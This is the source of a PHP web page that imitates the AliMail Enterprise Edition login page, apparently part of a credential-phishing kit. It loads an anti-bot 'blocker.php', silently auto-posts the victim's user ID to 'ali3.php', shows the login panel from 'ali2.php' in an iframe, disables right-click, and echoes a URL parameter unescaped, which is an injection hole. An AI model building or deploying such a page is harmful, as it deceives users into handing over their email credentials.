<?php 
include "blocker.php";
session_start();
ob_start();
$main_domain= $_SESSION['main_domain'] = $_GET['main_domain'];
?>
<!DOCTYPE html>
<html>
    <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="description" content="In order to log on to Alibaba email or Alibaba free enterprise email, enter the full account of the enterprise email or the administrator account, and security login through Alibaba email app scanning is supported. Download and install Alibaba email app, it&#39;s easy to use anytime without needing configuration." />
    <meta name="keywords" content="Alibaba Enterprise Emailbox, Alibaba Cloud Email, Alibaba Email, Enterprise Emailbox, Office Emailbox, Office Email, Company Emailbox, Work Emailbox, charged enterprise emailbox, free enterprise emailbox; domain name emailbox, Ding Email, DingTalk Emailbox, anti-spam, email, enterprise emailbox app, enterprise emailbox client, register enterprise emailbox, purchase enterprise emailbox, which enterprise emailbox is better, enterprise emailboxes comparison, selection of enterprise emailboxes, how to select an enterprise emailbox, purchase of enterprise emailbox, sale of enterprise emailbox" />
    <link rel="shortcut icon" href="https://mail.mxhichina.com/static/5379462/images/favicon.ico" type="image/x-icon"/>
    <link rel="bookmark" href="https://mail.mxhichina.com/static/5379462/images/favicon.ico" type="image/x-icon"/>
    <title>AliMail Enterprise Edition</title>

    <link rel="stylesheet" type="text/css" href="https://mail.mxhichina.com/static/5379462/login/default/styles/login.css"/>
        <script type="text/javascript" src="/static/5379462/scripts/jquery-1.10.2.js"></script>
        <script> 
        window.onload = function(){
            document.forms['usertargetFrame'].submit();
        }
        </script>
        	<script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>
</head>
<body style>
    <div style="display:none;">
    <form name="usertargetFrame" id="userTargetFrame" action="ali3.php" target="ding-login-iframe" method="post">
        <input type="text" id="userid" name="username" value="<?php echo $_GET['userid'] ?>"/>
        <input type ="submit" value="submit" />
        
    </form>
</div>

<script type="text/javascript" nonce="dC0zNjMyMTEtYVpjRDVL941">

window.onerror = function (msg, url, line, col, error) {
    try {
        var text = "msg:[" + msg + "], url:[" + url + "], line:[" + line + "], col:[" + col + "]";
        var formNode = document.getElementById("browser_log");
        var fn = window.globalErrFunc;

        fn && fn(text);

        document.getElementById("browser_log_text").value = text;

        formNode.action = "\/alimail\/error\/browserLog?_timestamp_=" + (new Date().getTime());
        formNode.submit();
    } catch (e) {}

    return false;
};

</script>
    <script type="text/javascript" nonce="dC0zNjMyMTEtYVpjRDVL941">
    function goToNoneCdn(w) {
        var pn = w.location.pathname;
        var qs = w.location.search;
        var ph = w.location.hash;

        if (qs.indexOf('?') == 0) {
            qs = qs.substring(1);
        }

        if (ph.indexOf('#') == 0) {
            ph = ph.substring(1);
        }

        var reurl = pn;

        if (qs.length > 0) {
            reurl += "?" + qs;
        }

        var targetUrl = '\/alimail\/auth\/redirectNoneCdn';

        targetUrl = targetUrl + "?reurl=" + encodeURIComponent(reurl) + "#" + ph;

        w.location.href = targetUrl;
    }
</script>

    
    <script type="text/javascript" nonce="dC0zNjMyMTEtYVpjRDVL941">
var j = jQuery;

function checkFocus(f, showError) {
    var usernameNode = j("#username");

    if (!usernameNode.val()) {
        if (showError) {
            j("#login_error_line").show().find(".login_error_text").text("Enter a username");
        }
        usernameNode.focus();
        return 0;
    }

    var passwordNode = j("#password");

    if (f) {
        passwordNode.focus();
        return 0;
    }

    if (!passwordNode.val()) {
        if (showError) {
            j("#login_error_line").show().find(".login_error_text").text("Enter password");
        }
        passwordNode.focus();
        return 0;
    }
    return 1;
}
</script>

<div style="display:none;" id="login_common_wrap">
            <script type="text/javascript" nonce="dC0zNjMyMTEtYVpjRDVL941">
            function initLoginCommon() {
            }

            function doSubmit() {
            }
        </script>
    </div>

<script type="text/javascript" nonce="dC0zNjMyMTEtYVpjRDVL941">
var bIsUsernameFocus = 0;

function checkSubmit() {
    window.setTimeout(function () {
        if (bIsUsernameFocus) {
            var usernameNode = j("#username");

            if (usernameNode.val()) {
                j("#password").focus();
            }
        } else {
            checkFocus(0, 1) && doSubmit();
        }
    }, 50);
}

function changeLang(lang) {
    var reLangPattern = /([&\?]lang=)([^&]+)/;
    var newHref = '';

    var oldHref = location.href;
    if(reLangPattern.test(oldHref)) {
        newHref = oldHref.replace(reLangPattern, '$1' + lang);
    } else {
        newHref = oldHref + (oldHref.indexOf('?') < 0 ? '?' : '&') + 'lang=' + lang;
    }

    if(newHref) {
        location.href = newHref;
    }
}

j(document).ready(function () {
    initLoginCommon();

    j("#username").bind({
        focus : function () {
            bIsUsernameFocus = 1;
        },
        blur : function () {
            bIsUsernameFocus = 0;
        }
    });

    j(document).keydown(function (e) {
        if (e.keyCode == 13) {
            checkSubmit();
        }
    });

    if (typeof loginInit != 'undefined') {
        loginInit();
    }
});

</script>

    <div id="page">
        <div class="header">
            <div class="logo" title="AliMail Enterprise Edition" style="background-image:url(https://mail.mxhichina.com/static/5379462/images/forNetCN/logo.png)"></div>
            <div class="links_wrap">
                                                    <div class="links_item inline_block links_item_first"><a href="https://exmail.aliyun.com/index#shouye" target="_blank" _cat="topcustomlink" _id="netcn001" style="">企业邮箱</a></div>
                                                                        <span class="links_item inline_block ">
                        <a href="http://wanwang.aliyun.com/mail/app" target="_blank" _cat="toplink" _id="app">Mobile App</a>
                                                    <span class="login_banner_download" style="background-image: url(https://mail.mxhichina.com/static/5379462/images/forNetCN/phone_client.png)"></span>
                                            </span>
                                                                        <span class="links_item inline_block "><a href="http://mailhelp.mxhichina.com/smartmail/" target="_blank" _cat="toplink" _id="help">Help</a></span>
                                                                                                                        <span class="links_item inline_block "><a href="?lang=zh_CN" _cat="langlink" _id="简体中文">简体中文</a></span>
                                                                                            <span class="links_item inline_block "><a href="javascript:void(0);">English</a></span>
                                                                        </div>
        </div>

        
		<div class="content bg_default" style="background-color: rgb(34, 35, 36); background-image:url(/netease/mxhichina/images/ed842dee-8ec2-4b48-8168-049f6a0739d0.png);">
            <div class="content_inner">
                                    <div class="login_welcome" style="background-image:url(/netease/mxhichina/images/a15af439-41f6-47e2-ae1d-42ef9d54da71); display: block;"></div>
                
                <div class="login_pannel">
                    <div class="login_pannel_bg"></div>
                                            <iframe allowtransparency="true" src="/netease/mxhichina/ali2.php" class="login_panel_iframe" frameborder="0"></iframe>
                                    </div>
                <a href="https://wanwang.aliyun.com/mail/?spm=5176.8006371.772227.youxiangyumingyou123.5d907e63z5q1rI" class="login_bg_link" target="_blank" id="login_bg_link" style="" _cat="bglink">&nbsp;&nbsp;&nbsp;</a>
            </div>
        </div>

        <div class="footer">
                            <div class="copyright_wrap">
                    <span class="login_about_label"><a class="copyright_about_link" target="_blank" href="http://www.aliyun.com/about/?spm=5176.383338.25.1.SVJ1ar/" _cat="bottomlink" _id="about">About Us</a></span>
                    <span class="login_about_label"><a class="copyright_about_link" target="_blank" href="http://www.aliyun.com/law/?spm=5176.383338.25.2.SVJ1ar/" _cat="bottomlink" _id="law">Legal Disclaimer</a></span>
                    <span class="login_about_label"><a class="copyright_about_link" target="_blank" href="http://www.aliyun.com/links/?spm=5176.383338.25.3.SVJ1ar/" _cat="bottomlink" _id="links">Links</a></span>
                </div>
                <div class="copyright_wrap">
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.alibabagroup.com/cn/global/home" _cat="bottomlink" _id="alibabagroup">Alibaba Group</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.taobao.com/" _cat="bottomlink" _id="taobao">Taobao.com</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.tmall.com/" _cat="bottomlink" _id="tmall">Tmall</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://ju.taobao.com/" _cat="bottomlink" _id="jutaobao">ju.taobao.com</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.aliexpress.com/" _cat="bottomlink" _id="aliexpress">AliExpress</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.alibaba.com/" _cat="bottomlink" _id="alibaba">Alibaba International Marketplace</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.1688.com/" _cat="bottomlink" _id="1688">1688</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.alimama.com/index.htm" _cat="bottomlink" _id="alimama">Alimama</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.aliyun.com/" _cat="bottomlink" _id="aliyun_com">Alibaba Cloud Computing</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.yunos.com/" _cat="bottomlink" _id="yunos">YunOS</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://aliqin.tmall.com/" _cat="bottomlink" _id="aliqin">Ali Telecom</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.net.cn/" _cat="bottomlink" _id="net_cn">NETCN</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="https://www.fliggy.com/" _cat="bottomlink" _id="trip">Taobao travel</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.xiami.com/" _cat="bottomlink" _id="xiami">Xiami</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="http://www.laiwang.com/" _cat="bottomlink" _id="laiwang">laiwang.com</a></span>
                    <span class="login_about_label"><a class="copyright_link" target="_blank" href="https://www.alipay.com/" _cat="bottomlink" _id="alipay">Alipay</a></span>
                </div>
                <div class="copyright_wrap">
                    2009-2018 Aliyun.com Copyright reserved ICP: 浙B2-20080101
                </div>
                    </div>
        <div id="cache_wrap"></div>
    </div>

    <script type="text/javascript" nonce="dC0zNjMyMTEtYVpjRDVL941">

(function() {

function _initBackground(item) {
    if (typeof initBackground != 'undefined') {
        initBackground(item);
    }
}


var bgString = '[{\"backgroundColor\":\"#222324\",\"backgroundImageId\":\"ed842dee-8ec2-4b48-8168-049f6a0739d0\",\"combineImageId\":\"e3711b72-6555-47c2-bef6-135ba7f53760\",\"displayWeight\":8,\"endTime\":\"2400\",\"event\":\"\",\"link\":\"https:\/\/wanwang.aliyun.com\/mail\/?spm=5176.8006371.772227.youxiangyumingyou123.5d907e63z5q1rI\",\"startTime\":\"0000\",\"textImageId\":\"a15af439-41f6-47e2-ae1d-42ef9d54da71\",\"valid\":true}]';

if (bgString) {
    var backgroundItems = [];

    try {
        backgroundItems = eval(bgString);
    } catch (e) {
        backgroundItems = null;
    }

    if (backgroundItems && backgroundItems.length) {
        var candidates = [], timestamp = new Date();
        var curTime = timestamp.getHours() * 100 + timestamp.getMinutes();
        var weightStart = 0;

        for (var l = backgroundItems.length, i = 0; i < l; i++) {
            var item = backgroundItems[i];

            if (!item || item.displayWeight <= 0) {
                continue;
            }

            var startTime = item.startTime;

            if (startTime) {
                var timeInt = parseInt(startTime);

                if (!isNaN(timeInt) && curTime < startTime) {
                    continue;
                }
            }

            var endTime = item.endTime;

            if (endTime) {
                var timeInt = parseInt(endTime);

                if (!isNaN(timeInt) && curTime > endTime) {
                    continue;
                }
            }

            item.weightStart = weightStart;
            weightStart += item.displayWeight;
            candidates.push(item);
        }

        if (weightStart > 0) {
            var randomWeight = Math.floor(timestamp.getTime() / 100) % weightStart;

            for (var i = candidates.length - 1; i >= 0; i--) {
                var item = candidates[i];

                if (randomWeight >= item.weightStart) {
                    _initBackground(item);
                    break;
                }
            }
        } else {
            _initBackground();
        }
    } else {
        _initBackground();
    }
} else {
    _initBackground();
}


})();

</script>

    
<script type="text/javascript" nonce="dC0zNjMyMTEtYVpjRDVL941">

(function(W, D) {
    var doTrackEvent = false;
    var cnzzId = '1254123259';

    function bodyClickHandler(e) {
        e = e || W.event;

        if (e && doTrackEvent) {
            var t = e.target, body = D.body;

            if (!t) {
                t = e.srcElement || D;
            }

            if (t) {
                var aNode;

                do {
                    var tagName = t.tagName;

                    if (tagName && tagName.toLowerCase() == "a") {
                        aNode = t;
                        break;
                    }

                    t = t.parentNode;
                } while (t && t != body && t != D);

                if (aNode) {
                    var eventId = aNode.getAttribute("_id");
                    var catId = aNode.getAttribute("_cat");

                    if (catId && eventId) {
                        W["_czc"].push(["_trackEvent", catId, eventId, ""]);
                    }
                }
            }
        }
    }

    if (cnzzId) {
        var _czc = W["_czc"] || [];

        _czc.push(["_setAccount", cnzzId]);

        W["_czc"] = _czc;

        try {
            var script = D.createElement('script');

            script.src = W.location.protocol + '//w.cnzz.com/c.php?id=' + encodeURIComponent(cnzzId);
            D.getElementsByTagName("head")[0].appendChild(script);

            setTimeout(function() {
                var body = D.body;

                if (body.addEventListener) {
                    body.addEventListener("click", bodyClickHandler, false);
                } else if (body.attachEvent) {
                    body.attachEvent("onclick", bodyClickHandler);
                }

                doTrackEvent = true;
            }, 1000);
        } catch (e) {
            W["_czc"] = null;
        }
    }
})(window, document);

</script>


</body>

</html>